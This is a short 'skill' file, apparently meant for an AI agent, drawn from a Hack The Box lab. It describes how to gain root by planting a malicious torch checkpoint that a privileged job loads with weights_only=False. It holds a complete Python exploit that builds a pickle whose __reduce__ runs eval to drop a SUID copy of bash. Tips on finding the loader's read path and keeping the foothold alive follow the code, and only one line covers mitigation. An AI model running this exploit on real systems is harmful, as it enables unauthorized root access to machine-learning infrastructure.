# Skill: Untrusted torch checkpoint (weights_only=False) -> privilege RCE

From: HTB Bedside. Trigger: a higher-privilege job (root cron, trainer
service, ML pipeline) loads `.pt`/`.pth` files from a directory the
compromised user can write to — MONAI `CheckpointLoader`, plain
`torch.load()`, Lightning `load_from_checkpoint` fired without
`weights_only=True`. torch < 2.0 defaults to `weights_only=False`, and
model code frequently pins the insecure call explicitly.

Build a pickle whose `__reduce__` does the work; a dict subclass keeps
loaders that expect a state dict happy:

```bash
python3 - <<'EOF'
import pickle
code = "import os; os.system('cp /bin/bash /var/tmp/rootbash && chmod 4755 /var/tmp/rootbash')"
class BadStateDict(dict):
    def __reduce__(self):
        return (eval, (code,), None)
with open("checkpoint.pt", "wb") as f:
    pickle.dump(BadStateDict({"epoch": 1, "state_dict": {}}), f)
EOF
cp checkpoint.pt /datastore/checkpoints/        # wherever the root job reads
# poll for the artifact the payload drops, or wait for the job's schedule
```

Notes
- Find the read path first (watchdir via `inotifywait`/`lsof`/auditd) —
  guessing the normalize path wastes a full schedule cycle.
- Keep the payload a single round-trip: staging + drop via the web-service
  RCE, then poll; don't interactive-shell where you can file-stage.
- Some loaders (MONAI `CheckpointLoader`) pass `map_location` and look for
  specific keys — the dict-subclass shape above survives renaming/torch
  internals on read.
- `cap`-style SUID drop is the persistent step; direct `os.setuid(0)` shell
  may die when the parent job kills its children.
- Mitigation analog: `weights_only=True` (torch >= 1.13), service-owned
  checkpoint dirs, read-only mount. Framework-respected: authorized targets.
